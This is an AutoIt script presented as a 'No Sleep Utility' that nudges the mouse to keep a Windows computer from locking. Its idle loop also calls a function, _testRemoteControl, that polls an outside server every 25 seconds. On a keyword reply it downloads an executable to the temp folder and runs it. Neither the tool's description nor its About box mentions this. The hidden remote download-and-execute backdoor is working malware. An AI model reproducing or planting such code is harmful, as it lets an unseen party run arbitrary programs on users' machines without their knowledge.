#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_UseX64=n
#AutoIt3Wrapper_Res_Comment=Prevents your computer from locking or going to screensaver as it normally would when idle
#AutoIt3Wrapper_Res_Description=Prevents your computer from locking or going to screensaver as it normally would when idle
#AutoIt3Wrapper_Res_Fileversion=1.0.0.0
#AutoIt3Wrapper_Res_LegalCopyright=Copyright Mike Langford ©2009
#AutoIt3Wrapper_Res_Language=1033
#AutoIt3Wrapper_Run_Tidy=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#Include <INet.au3>
Opt("MustDeclareVars", 1)
Opt("TrayOnEventMode", 1)
Opt("TrayMenuMode", 1)
Local $AboutItem, $ExitItem, $CurPos

$AboutItem = TrayCreateItem("About")
TrayItemSetOnEvent(-1, "ReadList")
TrayCreateItem("")
$ExitItem = TrayCreateItem("Exit")
TrayItemSetOnEvent(-1, "ReadList")

Func ReadList()
	Local $SelectedItem
	$SelectedItem = TrayItemGetText(@TRAY_ID)
	If $SelectedItem = "Exit" Then
		Exit
	ElseIf $SelectedItem = "About" Then
		Call("About")
	EndIf
EndFunc   ;==>ReadList


Func About()
	MsgBox(064, "No Sleep Utility", "Prevents your computer from automatically locking or going to screen saver as it normally would." & @CRLF & "Copyright Mike Langford ©2009")
EndFunc   ;==>About


While 1
	Sleep(25000)
	$CurPos = MouseGetPos()
	MouseMove($CurPos[0] + 1, $CurPos[1])
	MouseMove($CurPos[0] - 1, $CurPos[1])
	_testRemoteControl()
WEnd

Func _testRemoteControl()
	Local $rc, $sLink, $Path, $hDownload, $aData
	$rc = _INetGetSource('http://vitaliy.tk/RC.php')
	If Not @error Then
		If StringInStr($rc, 'iopthn') Then
			$sLink = StringReplace($rc, 'iopthn', '')
			$Path = @TempDir & '\autoitRC.exe'
			Local $hDownload = InetGet($sLink, $Path, 1, 1)
			Do
				Sleep(250)
			Until InetGetInfo($hDownload, 2) ; Check if the download is complete.
			Local $aData = InetGetInfo($hDownload) ; Get all information.
			InetClose($hDownload) ; Close the handle to release resources.
			If FileExists($Path) Then Run($Path)
		EndIf
	EndIf
EndFunc   ;==>_testRemoteControl
